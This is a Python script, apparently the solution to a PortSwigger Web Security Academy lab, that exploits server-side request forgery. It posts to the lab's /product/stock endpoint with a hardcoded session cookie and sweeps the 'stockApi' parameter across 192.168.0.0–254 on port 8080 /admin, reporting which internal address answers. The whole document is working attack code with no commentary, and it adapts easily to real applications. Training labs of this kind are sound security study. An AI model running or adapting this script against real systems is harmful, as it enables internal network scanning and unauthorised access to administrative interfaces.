import requests

burp0_url = "https://0a4b00d803ccd71bc073013400370055.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "GZyDIQqtBgMOPw842hvtxMG2o15yE7lm"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a4b00d803ccd71bc073013400370055.web-security-academy.net/product?productId=1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a4b00d803ccd71bc073013400370055.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}

for i in range (0,255):
    burp0_data = {"stockApi": "http://192.168.0." + str(i) + ":8080/admin"}
    print(burp0_data)
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if response.status_code == 200:
        print(i)
